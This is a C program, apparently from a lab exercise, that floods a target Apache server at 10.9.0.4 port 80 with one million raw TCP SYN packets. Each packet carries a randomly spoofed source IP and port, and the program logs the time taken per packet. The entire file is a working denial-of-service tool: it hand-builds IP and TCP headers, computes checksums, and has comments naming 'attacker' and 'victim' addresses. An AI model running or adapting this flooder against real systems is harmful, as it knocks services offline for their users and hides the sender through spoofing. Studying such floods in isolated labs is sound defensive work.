#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <unistd.h>
#include <time.h>

#define RUNS 1000000                        // packet sent number

struct pseudo_header {
    u_int32_t source_address;               // attacker ip
    u_int32_t dest_address;                 // victim ip
    u_int8_t placeholder;
    u_int8_t protocol;                      // packet protocol
    u_int16_t tcp_length;                   // header & data length
};
unsigned short checksum(void *b, int len) {    
    unsigned short *buf = b;                    // buffer given         
    unsigned int sum = 0;                       // sum = 0 
    unsigned short result;                    

    for (sum = 0; len > 1; len -= 2)           // adds 2 byte from buffer to sum
        sum += *buf++;                         
    if (len == 1)                              // add odd last byte
        sum += *(unsigned char*)buf; 
    sum = (sum >> 16) + (sum & 0xFFFF);        // add carry bits
    sum += (sum >> 16);
    result = ~sum;                             // convert to bytes
    return result;
}
char *randomIp() {
    static char ip[16];
    snprintf(ip, sizeof(ip), "%d.%d.%d.%d", rand()%256, rand()%256, rand()%256, rand()%256);
    return ip;
}

void send_syn_packets(int sock, struct sockaddr_in *target, FILE *fp) {
    char packet[4096];
    struct iphdr *iph = (struct iphdr *) packet;
    struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof(struct iphdr));
    struct pseudo_header psh;

    double total_time = 0.0;
    
    for (int i = 1; i < RUNS+1; i++) {
        if (i%10000 == 0){ printf("At %d percent", i/10000); }      // print progress
         memset(packet, 0, 4096);                                   // empty packet buffer
        clock_t start = clock();

        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id = htonl(rand() % 65535); // Random ID
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;  // Initial checksum (calculated later)
        iph->saddr = inet_addr(randomIp()); // Random source IP
        iph->daddr = target->sin_addr.s_addr;

        // Fill in the TCP Header
        tcph->source = htons(rand() % 65535); // Random source port
        tcph->dest = htons(80); // Destination port
        tcph->seq = 0;
        tcph->ack_seq = 0;
        tcph->doff = 5; // Data offset
        tcph->fin = 0;
        tcph->syn = 1; // SYN flag
        tcph->rst = 0;
        tcph->psh = 0;
        tcph->ack = 0;
        tcph->urg = 0;
        tcph->window = htons(5840); // Maximum allowed window size
        tcph->check = 0; // Initial checksum
        tcph->urg_ptr = 0;

        // Now calculate the TCP checksum
        psh.source_address = iph->saddr;
        psh.dest_address = iph->daddr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));

        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
        char *pseudogram = malloc(psize);

        memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));

        tcph->check = checksum(pseudogram, psize);

        free(pseudogram);

        iph->check = checksum((unsigned short *) packet, iph->tot_len);

        if (sendto(sock, packet, iph->tot_len, 0, (struct sockaddr *) target, sizeof(*target)) < 0) {
            perror("Send failed");
        }

        clock_t end = clock();
        double time_spent = (double)(end - start) / CLOCKS_PER_SEC;
        total_time += time_spent;

        // Log result to the file
        fprintf(fp, "Packet %d, Time: %f seconds\n", i, time_spent);
    }

    // Log the total and average times
    fprintf(fp, "Total time to send all packets: %f seconds\n", total_time);
    fprintf(fp, "Average time per packet: %f seconds\n", total_time / RUNS);
}

int main() {
    srand(time(0));  // Seed the random number generator

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket error");
        exit(1);
    }

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(80);
    target.sin_addr.s_addr = inet_addr("10.9.0.4");  // Target Apache server IP

    // Open the result file
    FILE *fp = fopen("syns_results_c.txt", "w");
    if (fp == NULL) {
        perror("Error opening file");
        return 1;
    }

    send_syn_packets(sock, &target, fp);

    fclose(fp);
    close(sock);
    return 0;
}
